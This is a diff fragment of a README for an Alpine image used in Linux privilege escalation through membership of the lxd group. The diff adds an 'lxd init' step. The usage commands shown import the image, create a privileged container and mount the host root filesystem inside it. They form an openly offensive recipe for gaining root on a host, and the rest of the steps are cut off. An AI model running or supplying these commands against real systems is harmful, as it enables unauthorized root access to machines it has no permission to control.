@@ -4,6 +4,7 @@ This alpine for linux privesc. Its works when the user is part of lxd group.
 # Usage:
 ```
 unzip alpine.zip
+lxd init 
 lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
 lxc init alpine r00t -c security.privileged=true
 lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
